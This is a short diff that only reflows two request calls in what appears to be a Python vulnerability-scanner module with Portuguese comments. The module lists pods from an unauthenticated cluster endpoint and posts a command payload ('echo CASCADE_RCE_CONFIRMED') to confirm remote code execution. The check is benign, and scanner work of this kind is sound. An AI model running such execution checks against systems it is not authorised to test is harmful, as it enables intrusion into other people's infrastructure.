@@ -24,9 +24,7 @@ def run(target, ip, ports, banners):
 
     try:
         # Step 1: Verificar se consegue extrair a lista de PODS (sem auth)
-        resp = requests.get(
-            f"{base_url}/pods", headers=headers, timeout=5, verify=False
-        )
+        resp = requests.get(f"{base_url}/pods", headers=headers, timeout=5, verify=False)
 
         if resp.status_code == 200 and "items" in resp.json():
             data = resp.json()
@@ -45,9 +43,7 @@ def run(target, ip, ports, banners):
 
                     payload = {"cmd": "echo CASCADE_RCE_CONFIRMED"}
 
-                    rce_resp = requests.post(
-                        rce_url, data=payload, headers=headers, timeout=5, verify=False
-                    )
+                    rce_resp = requests.post(rce_url, data=payload, headers=headers, timeout=5, verify=False)
 
                     if "CASCADE_RCE_CONFIRMED" in rce_resp.text:
                         finding = {
